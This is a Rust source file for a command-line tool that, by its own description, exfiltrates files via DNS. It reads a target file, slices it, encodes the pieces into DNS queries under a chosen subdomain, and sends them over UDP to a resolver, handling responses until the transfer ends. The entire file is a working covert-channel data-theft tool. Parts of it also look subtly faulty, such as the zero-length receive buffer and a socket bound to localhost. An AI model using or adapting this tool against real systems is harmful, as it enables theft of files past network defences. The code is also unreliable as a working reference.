use std::fs;
use std::io;
use std::net::{UdpSocket};

use structopt::StructOpt;
use trust_dns_proto::rr::domain::Label;
use trust_dns_proto::rr::Name;
use trust_dns_proto::serialize::binary::{BinDecodable, BinDecoder, BinEncodable, BinEncoder};

use dns_encoding::client::TransmissionState;
use dns_encoding::encode::MessageEncoder;
use dns_encoding::message::{Message, MessageResponse};

#[derive(Debug, StructOpt)]
#[structopt(name = "dns-exfiltrating-client", about = "An client to exfiltrate files via dns.")]
struct Opt {
    file_name: String,

    #[structopt(short, long)]
    dns_resolver: String,

    #[structopt(short, long)]
    sub_domain: String,

    #[structopt(short, long)]
    host: String,

    #[structopt(long, default_value = "20")]
    slice_size: usize,

    #[structopt(short, long, default_value = "")]
    magic_nr: String,
}

struct Encoder {
    message_encoder: MessageEncoder,
    buffer: Vec<u8>,
}

impl Encoder {
    fn new(message_encoder: MessageEncoder) -> Encoder {
        let buffer = Vec::with_capacity(1024);
        Encoder { message_encoder, buffer }
    }

    fn encode(&mut self, message: Message) {
        self.buffer.clear();
        let dns_message = self.message_encoder.encode(message);
        let mut binary_encoder = BinEncoder::new(&mut self.buffer);
        dns_message.emit(&mut binary_encoder).unwrap();
    }

    fn as_slice(&self) -> &[u8] {
        self.buffer.as_slice()
    }
}

struct Decoder {
    buffer: Vec<u8>,
}

impl Decoder {
    fn new() -> Decoder {
        let buffer = Vec::with_capacity(1024);
        Decoder { buffer }
    }

    fn decode(&mut self) -> MessageResponse {
        let mut binary_decoder = BinDecoder::new(&self.buffer);
        let server_message = trust_dns_proto::op::Message::read(&mut binary_decoder).unwrap();
        let server_message = MessageResponse::decode(&server_message).unwrap();
        self.buffer.clear();
        server_message
    }

    fn as_slice(&mut self) -> &mut [u8] {
        self.buffer.as_mut_slice()
    }
}

fn main() -> io::Result<()> {
    let opt: Opt = Opt::from_args();
    println!("opt = {:?}", opt);

    let contents = fs::read_to_string(&opt.file_name)?;
    let mut client_state = TransmissionState::new(opt.host,
                                                  opt.file_name.clone(),
                                                  contents.into_bytes(),
                                                  opt.slice_size);
    let magic_nr = Label::from_ascii(opt.magic_nr.as_str()).unwrap();
    let subdomain = Name::from_ascii(opt.sub_domain.as_str()).unwrap();

    let mut encoder = Encoder::new(MessageEncoder::new(magic_nr, subdomain));
    let mut decoder = Decoder::new();

    let first_message = client_state.initial_message();

    let socket = UdpSocket::bind("127.0.0.1:12345")?;

    encoder.encode(first_message);
    socket.send_to(encoder.as_slice(), &opt.dns_resolver)?;
    loop {
        let (_bytes_read, address) = socket.recv_from(&mut decoder.as_slice())?;
        println!("recieved message from {:?}", address);
        let server_message = decoder.decode();
        let response = client_state.handle_response(server_message);
        match response {
            None => break,
            Some(response) => {
                encoder.encode(response);
                socket.send_to(&encoder.as_slice(), &opt.dns_resolver)?;
            }
        }
    }
    println!("Finished transmission of {}", &opt.file_name);
    Ok(())
}
